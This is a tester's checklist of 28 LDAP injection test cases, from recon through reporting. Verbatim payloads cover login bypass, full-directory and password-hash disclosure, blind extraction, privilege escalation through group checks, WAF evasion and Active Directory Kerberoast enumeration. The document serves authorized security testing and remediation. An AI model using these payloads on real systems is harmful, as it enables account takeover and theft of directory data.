# LDAP Injection — Checklist

Expert per-attack **test-case matrix** for LDAP Injection — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*28 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## LDAP-001 — Map LDAP-backed features
**Test Category:** Recon &amp; Fingerprint · **Severity:** Info · **CVSS:** 0.0 (N/A)

**LDAP Context:** N/A

**Where to Test / Injection Point:** Corporate/SSO/VPN/appliance login, people/directory search, group/role checks, signup uniqueness

**Test Steps:** 1. Find every LDAP-backed feature: login (corporate/SSO/VPN/printer/MFP), 'find people/employees' search, group/role authorization checks, 'forgot username', signup uniqueness checks.<br>2. Note which reflect results (data-reflected) vs only succeed/fail (auth-oracle).<br>3. Group/role checks are often higher impact than the login.

**Expected Result:** A catalogue of LDAP sinks with their observability class.

**Payload Example:**

```
corporate login form; /directory?q= people search; role check on an admin feature
```

**Impact:** Defines the LDAP attack surface; authz checks frequently outrank the login for impact.

**Tools:** Burp Suite Pro, manual

**References:** CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-002 — Grep source for filter-building code
**Test Category:** Recon &amp; Fingerprint · **Severity:** Info · **CVSS:** 0.0 (N/A)

**LDAP Context:** N/A

**Where to Test / Injection Point:** Gray-box: source / JS

**Test Steps:** 1. Search for raw filter concatenation: ldap_search, DirContext.search, DirectorySearcher, search_filter, ldapjs.<br>2. Distinguish parameterised/escaped filters (safe) from string-built ones.<br>3. Map hits to reachable inputs.

**Expected Result:** Code paths building LDAP filters/DNs by concatenation are identified.

**Payload Example:**

```
grep -rEn "ldap_search|DirContext.search|DirectorySearcher|search_filter|ldapjs" .
```

**Impact:** Pinpoints true injection sinks and proves root cause.

**Tools:** ripgrep, Semgrep

**References:** CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-003 — Fingerprint the directory backend
**Test Category:** Recon &amp; Fingerprint · **Severity:** Info · **CVSS:** 0.0 (N/A)

**LDAP Context:** N/A

**Where to Test / Injection Point:** Error messages / attribute names

**Test Steps:** 1. Active Directory hints: sAMAccountName, memberOf, DC=..., DSID errors.<br>2. OpenLDAP/389 hints: uid, cn, inetOrgPerson, javax.naming errors.<br>3. Flag second-order fields (displayName/description/group name) later consumed by admin search/sync.

**Expected Result:** The backend (AD vs OpenLDAP/389/etc.) and any second-order sinks are identified.

**Payload Example:**

```
AD: sAMAccountName / DSID-xxxx  |  OpenLDAP: javax.naming.NamingException
```

**Impact:** Backend choice selects the attribute set (AD Kerberoast/AS-REP vs generic) and parser tolerance.

**Tools:** Burp Repeater, ldapsearch

**References:** CWE-90; OWASP WSTG-INPV-06; HackTricks LDAP injection

---

## LDAP-004 — Special-character baseline &amp; observability class
**Test Category:** Detection — Baseline · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**LDAP Context:** AND / OR / DN

**Where to Test / Injection Point:** Any candidate LDAP input

**Test Steps:** 1. Send a normal value, then a single * , then a single ( .<br>2. Record result-count / error / auth result / response length for each.<br>3. Classify observability: DATA-REFLECTED / AUTH-ORACLE / ERROR-BASED / BLIND.

**Expected Result:** A * or ( changes result count, throws an LDAP error, or alters the auth result.

**Payload Example:**

```
q=alice   vs   q=*   vs   q=(
```

**Impact:** First signal of injectability and how you'll observe the oracle downstream.

**Tools:** Burp Repeater

**References:** CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection; PayloadsAllTheThings/LDAP Injection

---

## LDAP-005 — Determine filter context (AND vs OR, filter vs DN)
**Test Category:** Detection — Baseline · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**LDAP Context:** AND / OR / DN

**Where to Test / Injection Point:** Confirmed candidate

**Test Steps:** 1. Decide AND (&amp;(fixed)(x=INPUT)) vs OR (|(fixed)(x=INPUT)) vs DN context.<br>2. Check whether * ( ) \ are escaped (e.g. \2a shows in errors).<br>3. If filter-escaped, plan DN injection / second-order / WAF evasion.

**Expected Result:** The context is identified (AND/OR/filter/DN) and escaping behaviour known.

**Payload Example:**

```
*)(objectClass=*) widens under AND ; )( breakouts work only on tolerant parsers
```

**Impact:** Context dictates which breakout works; escaping tells you whether to pivot to DN/second-order.

**Tools:** Burp Repeater

**References:** CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-006 — Special-character probes
**Test Category:** Detection — Probing · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**LDAP Context:** AND / OR

**Where to Test / Injection Point:** Any LDAP input

**Test Steps:** 1. Send each metachar ALONE vs a normal value: * ( ) &amp; | ! \ = %00.<br>2. Watch result-count change / LDAP error / auth diff / response length.<br>3. \ alone often errors ('invalid escape'); ( often errors if injectable.

**Expected Result:** One or more metacharacters change results or trigger an LDAP error.

**Payload Example:**

```
* ( ) & | ! \ = %00   (each sent alone)
```

**Impact:** Establishes which metacharacters reach the filter unescaped.

**Tools:** Burp Repeater, poc/ldap_fuzz.py

**References:** CWE-90; OWASP WSTG-INPV-06; PayloadsAllTheThings/LDAP Injection

---

## LDAP-007 — Prove filter-logic change (not reflection)
**Test Category:** Detection — Probing · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**LDAP Context:** AND

**Where to Test / Injection Point:** Search/directory sink

**Test Steps:** 1. Compare q=alice (1 row) vs q=*)(objectClass=*) (whole tree).<br>2. A jump from one entry to everything proves the filter logic was altered - not mere reflection.<br>3. Record the entry-count delta.

**Expected Result:** q=*)(objectClass=*) returns far more entries than a specific value - proven logic change.

**Payload Example:**

```
q=*)(objectClass=*)
```

**Impact:** Distinguishes real injection from a reflected * (the #1 false positive).

**Tools:** Burp Repeater

**References:** CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection; PayloadsAllTheThings/LDAP Injection

---

## LDAP-008 — AND-context breakout
**Test Category:** Detection — Breakout · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**LDAP Context:** AND

**Where to Test / Injection Point:** AND filter (&amp;(fixed)(attr=INPUT))

**Test Steps:** 1. * -&gt; match any with attr.<br>2. *)(objectClass=*) -&gt; stays a single valid &amp; -&gt; whole tree.<br>3. *))(|(objectClass=*) -&gt; break OUT of the AND and OR-true the rest (tolerant parsers only).<br>4. admin)(&amp;) -&gt; absolute-true inside the group.

**Expected Result:** The AND filter is widened or broken out of, returning unintended entries.

**Payload Example:**

```
*)(objectClass=*)
*))(|(objectClass=*)
admin)(&)
```

**Impact:** Core primitive for disclosure/auth-bypass in the common AND login/search filter.

**Tools:** Burp Repeater

**References:** CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-009 — OR-context breakout
**Test Category:** Detection — Breakout · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**LDAP Context:** OR

**Where to Test / Injection Point:** OR filter (|(fixed)(attr=INPUT))

**Test Steps:** 1. * -&gt; matches everything with attr.<br>2. nope)(uid=*) -&gt; your OR clause matches all.<br>3. Confirm the widened match via result count.

**Expected Result:** The OR filter matches all entries via the injected always-true clause.

**Payload Example:**

```
nope)(uid=*)
```

**Impact:** Disclosure/bypass primitive for OR-based filters.

**Tools:** Burp Repeater

**References:** CWE-90; OWASP WSTG-INPV-06; PayloadsAllTheThings/LDAP Injection

---

## LDAP-010 — Error-based detection &amp; backend leak
**Test Category:** Detection — Error-Based · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**LDAP Context:** AND / OR

**Where to Test / Injection Point:** Sink that surfaces LDAP errors

**Test Steps:** 1. Trigger an LDAP error with ( or \ .<br>2. Capture the backend type and base DN from the message (DSID / javax.naming / base DN).<br>3. Use the leaked DN for DN injection / ldapsearch.

**Expected Result:** An LDAP error message discloses the backend and/or base DN.

**Payload Example:**

```
q=(   ->  error revealing DSID-... or javax.naming.NamingException + base DN
```

**Impact:** Fingerprints the directory and leaks the DN needed for deeper exploitation.

**Tools:** Burp Repeater

**References:** CWE-90; OWASP WSTG-INPV-06; HackTricks LDAP injection

---

## LDAP-011 — Blind boolean oracle
**Test Category:** Detection — Blind · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**LDAP Context:** AND

**Where to Test / Injection Point:** Sink with no reflected data but a stable true/false response

**Test Steps:** 1. Build the oracle: TRUE q=alice)(uid=alice) vs FALSE q=alice)(uid=nobody999).<br>2. Confirm a stable, repeatable response difference.<br>3. This oracle drives existence checks and char-by-char extraction.

**Expected Result:** The two payloads yield consistently different responses - a usable boolean oracle.

**Payload Example:**

```
TRUE:  alice)(uid=alice)
FALSE: alice)(uid=nobody999)
```

**Impact:** Enables blind extraction where no data is reflected.

**Tools:** Burp Intruder, poc/ldap_blind.py

**References:** CWE-90; OWASP WSTG-INPV-06; Chema Alonso et al., 'LDAP Injection &amp; Blind LDAP Injection' (Black Hat EU 2008)

---

## LDAP-012 — Auth bypass — known username
**Test Category:** Impact — Auth Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**LDAP Context:** AND (login)

**Where to Test / Injection Point:** Login filter (&amp;(uid=$user)(userPassword=$pass))

**Test Steps:** 1. Comment/neutralise the password clause for a known user.<br>2. admin)(&amp;) (absolute-true); admin)(|(uid=* (OR-true, tolerant); admin))%00 (NUL truncate the password clause).<br>3. Note which account you land as (admin = Critical).

**Expected Result:** You authenticate as the named user without a valid password.

**Payload Example:**

```
admin)(&)
admin)(|(uid=*
admin))%00
```

**Impact:** Direct account takeover; as admin it is full compromise.

**Tools:** Burp Repeater

**References:** OWASP WSTG-INPV-06; CWE-90; CWE-287; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-013 — Auth bypass — unknown username (first/any entry)
**Test Category:** Impact — Auth Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**LDAP Context:** AND (login)

**Where to Test / Injection Point:** Login filter, no known username

**Test Steps:** 1. Log in as the first/any entry (often admin/service).<br>2. user=* pass=* ; or *)(uid=*))(|(uid=* ; or *)(|(objectClass=*).<br>3. Note the resulting account.

**Expected Result:** Authentication succeeds as an arbitrary (often privileged) directory entry.

**Payload Example:**

```
*  (user and pass)
*)(uid=*))(|(uid=*
```

**Impact:** Account takeover without any valid credentials - often lands on a service/admin account.

**Tools:** Burp Repeater

**References:** OWASP WSTG-INPV-06; CWE-90; CWE-287; PortSwigger Web Security Academy: LDAP injection; PayloadsAllTheThings/LDAP Injection

---

## LDAP-014 — Auth bypass — both fields (classic breakout)
**Test Category:** Impact — Auth Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**LDAP Context:** AND (login)

**Where to Test / Injection Point:** Login where both user and pass are concatenated

**Test Steps:** 1. Inject the OWASP/PortSwigger dual-field breakout into both fields.<br>2. user=*)(uid=*))(|(uid=* and pass=*)(uid=*))(|(uid=* .<br>3. Confirm login.

**Expected Result:** The combined breakout makes the whole login filter always-true.

**Payload Example:**

```
user = *)(uid=*))(|(uid=*
pass = *)(uid=*))(|(uid=*
```

**Impact:** Reliable auth bypass on tolerant parsers where single-field payloads fail.

**Tools:** Burp Repeater

**References:** OWASP WSTG-INPV-06; CWE-90; CWE-287; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-015 — Directory disclosure — whole subtree
**Test Category:** Impact — Info Disclosure · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**LDAP Context:** AND

**Where to Test / Injection Point:** People/directory search

**Test Steps:** 1. q=*)(objectClass=*) to return the whole subtree (AND-true).<br>2. Quantify extra entries vs the intended scope.<br>3. Bound the read - sample, do not mass-dump.

**Expected Result:** The search returns the entire subtree instead of the intended narrow result.

**Payload Example:**

```
q=*)(objectClass=*)
q=*)(cn=*)
```

**Impact:** Mass PII disclosure from the directory - High (Critical if hashes present).

**Tools:** Burp Repeater

**References:** OWASP WSTG-INPV-06; CWE-90; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-016 — Disclosure — match hidden/high-value attributes
**Test Category:** Impact — Info Disclosure · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**LDAP Context:** AND

**Where to Test / Injection Point:** Directory search

**Test Steps:** 1. Force-match on hidden attributes: )(mail=* , )(telephoneNumber=* , )(memberOf=* .<br>2. )(userPassword=* -&gt; if readable = hashes (Critical).<br>3. AD: )(sAMAccountName=* , )(servicePrincipalName=* .<br>4. Alphabetical harvest if capped: a* b* admin* svc*.

**Expected Result:** Entries with sensitive attributes (memberOf/userPassword/SPN) are returned.

**Payload Example:**

```
q=*)(userPassword=*)
q=*)(memberOf=*)
q=*)(servicePrincipalName=*)
```

**Impact:** Exposure of credentials/hashes, group membership, and AD SPNs - High to Critical.

**Tools:** Burp Repeater, ldapsearch

**References:** OWASP WSTG-INPV-06; CWE-90; HackTricks LDAP injection

---

## LDAP-017 — Authorization/privilege-escalation via group check
**Test Category:** Impact — Authz Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**LDAP Context:** AND (authz)

**Where to Test / Injection Point:** Group/role check (&amp;(uid=$you)(memberOf=CN=Admins,...))

**Test Steps:** 1. Force the membership clause always-true: you)(memberOf=* or you)(|(memberOf=*) or you)(&amp;).<br>2. Or match the admins group regardless: *)(memberOf=CN=Domain Admins,$DC .<br>3. For NOT-based deny filters, add an always-true sibling / break the NOT.<br>4. Confirm you reach the admin-only feature.

**Expected Result:** The authorization check passes and an admin-only feature becomes reachable.

**Payload Example:**

```
you)(memberOf=*
*)(memberOf=CN=Domain Admins,$DC
```

**Impact:** Privilege escalation - often higher impact than the login bypass.

**Tools:** Burp Repeater

**References:** OWASP WSTG-INPV-06; CWE-90; CWE-285; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-018 — Blind extraction — presence/existence oracle
**Test Category:** Impact — Blind Extraction · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**LDAP Context:** AND

**Where to Test / Injection Point:** Blind sink with a boolean oracle

**Test Steps:** 1. Existence: (&amp;(uid=USERNAME)(objectClass=*)) -&gt; does the user exist?<br>2. Attribute presence: (&amp;(uid=admin)(userPassword=*)) -&gt; readable password attr?<br>3. Privilege: (&amp;(uid=admin)(memberOf=CN=Domain Admins,$DC)).

**Expected Result:** The oracle confirms existence/attribute-presence/privilege of a target entry.

**Payload Example:**

```
(&(uid=admin)(userPassword=*))
(&(uid=admin)(memberOf=CN=Domain Admins,$DC))
```

**Impact:** Enumerates users, sensitive attributes, and privileged accounts blindly.

**Tools:** Burp Intruder, poc/ldap_blind.py

**References:** CWE-90; OWASP WSTG-INPV-06; Chema Alonso et al., 'LDAP Injection &amp; Blind LDAP Injection' (Black Hat EU 2008)

---

## LDAP-019 — Blind extraction — char-by-char (substring wildcard)
**Test Category:** Impact — Blind Extraction · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**LDAP Context:** AND

**Where to Test / Injection Point:** Blind sink with a boolean oracle, benign test attribute

**Test Steps:** 1. First char: (&amp;(uid=admin)(userPassword=a*)) -&gt; iterate the charset.<br>2. Grow the prefix once confirmed: (&amp;(uid=admin)(userPassword=ab*)).<br>3. Binary-search with &gt;= / &lt;= to cut requests ~log2.<br>4. Extract only a few BENIGN chars of a benign attribute (your test user).

**Expected Result:** The oracle reveals attribute characters one prefix at a time.

**Payload Example:**

```
(&(uid=admin)(userPassword=a*))
(&(uid=admin)(userPassword>=m*))
```

**Impact:** Full blind attribute extraction (proven with a bounded, benign read).

**Tools:** Burp Intruder, poc/ldap_blind.py

**References:** CWE-90; OWASP WSTG-INPV-06; Chema Alonso et al., 'LDAP Injection &amp; Blind LDAP Injection' (Black Hat EU 2008); PayloadsAllTheThings/LDAP Injection

---

## LDAP-020 — DN injection
**Test Category:** Impact — DN Injection · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)

**LDAP Context:** DN

**Where to Test / Injection Point:** Input that builds a DN (uid=$user,ou=people,$DC)

**Test Steps:** 1. When the filter is escaped but the DN is built from input, inject DN metachars.<br>2. x,ou=admins -&gt; uid=x,ou=admins,ou=people,$DC (changes OU/scope).<br>3. Test the RFC 4514 DN set: , + " \ &lt; &gt; ; = and leading/trailing space, leading #.

**Expected Result:** The injected DN component changes the OU/scope of the operation.

**Payload Example:**

```
x,ou=admins
(DN chars: , + " \ < > ; =)
```

**Impact:** Scope/OU manipulation when filter injection is blocked - reaches other subtrees.

**Tools:** Burp Repeater

**References:** OWASP WSTG-INPV-06; CWE-90; PayloadsAllTheThings/LDAP Injection

---

## LDAP-021 — Second-order LDAP injection
**Test Category:** Impact — Second-Order · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)

**LDAP Context:** AND / OR

**Where to Test / Injection Point:** Stored profile field later consumed by admin search/sync

**Test Steps:** 1. Store a payload in a profile field (displayName/description/group name).<br>2. Trigger the consumer (admin directory search, sync job).<br>3. Confirm the filter logic fires when the stored value is used: displayName=*)(objectClass=* .

**Expected Result:** The stored payload alters an LDAP filter when a later feature consumes it.

**Payload Example:**

```
displayName = *)(objectClass=*   (fires on admin search/sync)
```

**Impact:** Bypasses input-facing defenses and often executes at higher privilege.

**Tools:** Burp Suite, manual

**References:** OWASP WSTG-INPV-06; CWE-90; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-022 — AD enumeration chains (Kerberoast / AS-REP)
**Test Category:** Impact — AD Post-Exploitation · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N)

**LDAP Context:** AND (Active Directory)

**Where to Test / Injection Point:** Active Directory backend, authorized red-team

**Test Steps:** 1. Once an injected filter or bind lets you query AD, enumerate high-value objects.<br>2. SPN accounts (Kerberoast): (servicePrincipalName=*).<br>3. AS-REP (no preauth): (userAccountControl:1.2.840.113556.1.4.803:=4194304).<br>4. Privileged: (adminCount=1). Use as proof; do not pivot out of scope.

**Expected Result:** AD Kerberoast/AS-REP/privileged accounts are enumerated via the injected/bound query.

**Payload Example:**

```
(servicePrincipalName=*)
(userAccountControl:1.2.840.113556.1.4.803:=4194304)
```

**Impact:** Feeds Kerberoast/AS-REP offline cracking -&gt; AD lateral movement (authorized only).

**Tools:** ldapsearch, windapsearch, BloodHound

**References:** CWE-90; OWASP WSTG-INPV-06; The Hacker Recipes: Active Directory; HackTricks LDAP injection

---

## LDAP-023 — Confirm via ldapsearch (once any bind is available)
**Test Category:** Impact — Verification · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**LDAP Context:** N/A

**Where to Test / Injection Point:** Anonymous or credentialed bind to the directory

**Test Steps:** 1. Anonymous bind (if allowed): ldapsearch -x -H ldap://dc -b "$DC" "(objectClass=*)".<br>2. With creds: add -D bind-DN -w PASS and target attrs (mail memberOf).<br>3. Use to confirm exactly what an injected filter would return.

**Expected Result:** The directory returns the entries an injected filter would match, confirming impact.

**Payload Example:**

```
ldapsearch -x -H ldap://dc.$TARGET -b "$DC" "(uid=*)" mail memberOf
```

**Impact:** Concretely quantifies the injected filter's reach for the report.

**Tools:** ldapsearch, windapsearch

**References:** CWE-90; OWASP WSTG-INPV-06; HackTricks LDAP injection

---

## LDAP-024 — Encoding evasion (URL / double / LDAP-hex)
**Test Category:** Evasion — WAF/Filter · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**LDAP Context:** AND / OR

**Where to Test / Injection Point:** WAF/filter blocking LDAP metacharacters

**Test Steps:** 1. URL-encode: *-&gt;%2a (-&gt;%28 )-&gt;%29 \-&gt;%5c &amp;-&gt;%26 |-&gt;%7c =-&gt;%3d !-&gt;%21 NUL-&gt;%00.<br>2. Double-encode where a decode precedes the filter: *-&gt;%252a.<br>3. LDAP hex where the app un-escapes: \2a (=*), \28 (=(), \29 (=)).

**Expected Result:** The encoded metacharacter survives the WAF and is decoded into the filter.

**Payload Example:**

```
q=%2a%29%28objectClass=%2a
q=\2a\29\28objectClass=\2a
```

**Impact:** Bypasses signature filters that block only literal metacharacters.

**Tools:** Burp Repeater, CyberChef

**References:** CWE-90; OWASP WSTG-INPV-06; PayloadsAllTheThings/LDAP Injection

---

## LDAP-025 — Absolute-true (&amp;) and NUL truncation
**Test Category:** Evasion — WAF/Filter · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**LDAP Context:** AND / OR

**Where to Test / Injection Point:** Filters blocking ( ) or trailing-clause exploitation

**Test Steps:** 1. Absolute-true (&amp;) needs only &amp; - tiny, often un-blacklisted (absolute-false (|)).<br>2. NUL truncate: append %00 to drop trailing clauses (C-backed servers).<br>3. Combine with a known username for a clean bypass.

**Expected Result:** (&amp;) forces truth without parentheses payloads, or %00 removes the password clause.

**Payload Example:**

```
admin)(&)
admin))%00
```

**Impact:** Minimal-footprint bypass that evades parenthesis/keyword filters.

**Tools:** Burp Repeater

**References:** CWE-90; OWASP WSTG-INPV-06; PortSwigger Web Security Academy: LDAP injection

---

## LDAP-026 — Attribute aliasing / swap
**Test Category:** Evasion — WAF/Filter · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**LDAP Context:** AND / OR

**Where to Test / Injection Point:** Filters blocking a specific attribute keyword

**Test Steps:** 1. objectClass blocked -&gt; use cn / uid / objectCategory (always-present alternatives).<br>2. AD attributes are case-insensitive with aliases: sAMAccountName, commonName/cn.<br>3. Whitespace/full-width where the directory normalises but the WAF does not.

**Expected Result:** An aliased/alternative attribute achieves the same match past the keyword filter.

**Payload Example:**

```
q=*)(objectCategory=*)   (objectClass blocked)
q=*)(cn=*)
```

**Impact:** Keeps disclosure/bypass working when a specific attribute keyword is filtered.

**Tools:** Burp Repeater

**References:** CWE-90; OWASP WSTG-INPV-06; PayloadsAllTheThings/LDAP Injection

---

## LDAP-027 — False-positive filter (rule out reflection / JNDI)
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**LDAP Context:** N/A

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. Reject: a * merely reflected (no change in matched entries); a lone 500/LDAP error with no logic change; a built-in wildcard search behaving as designed; username-enumeration via error differences (separate, lower bug); a single length blip (caching/jitter); logging in as a demo/guest account.<br>2. CRITICAL: ${jndi:ldap://...} callback is Log4Shell/JNDI (CVE-2021-44228) RCE - report as its OWN bug, not filter injection.<br>3. Require the directory's answer to demonstrably change (rows / auth result / stable oracle).

**Expected Result:** A confirmed filter-logic change with impact - not reflection, an error, a built-in feature, or JNDI.

**Payload Example:**

```
q=*)(objectClass=*) returns whole tree vs 1 row; oracle stable across retries
```

**Impact:** Protects credibility; LDAP injection is often confused with reflection, enum, or Log4Shell.

**Tools:** Burp, manual

**References:** OWASP WSTG-INPV-06; CWE-90; Log4Shell CVE-2021-44228 (distinct)

---

## LDAP-028 — Client-facing impact &amp; PoC package (CWE-90)
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**LDAP Context:** N/A

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with the highest impact (auth bypass &gt; authz/privesc &gt; disclosure &gt; blind).<br>2. Provide the exact request, context (AND/OR/DN), backend, and proof (extra rows / auth result / stable oracle); bound every read.<br>3. Set CVSS 3.1 + CWE-90 (+ CWE-287 auth bypass / CWE-285 authz). Remediation: parameterised LDAP APIs / proper filter escaping (RFC 4515) and DN escaping (RFC 4514), least-privilege bind account, input allowlisting, disable anonymous bind.<br>4. De-dupe to one finding per sink.

**Expected Result:** A reproducible, correctly-rated, benign PoC with clear remediation.

**Payload Example:**

```
PoC: request + context + proof (rows/auth/oracle) + CVSS + CWE-90 + fix guidance.
```

**Impact:** Converts the finding into a defensible, actionable report at the correct severity.

**Tools:** Burp, CVSS calculator, LDAP_INJECTION_REPORT_TEMPLATE.md

**References:** OWASP WSTG-INPV-06; CWE-90; CWE-287; FIRST CVSS v3.1  |  TOP REFERENCES: PortSwigger; PayloadsAllTheThings; HackTricks; BlackHat LDAP injection research; MITRE CWE-90

---
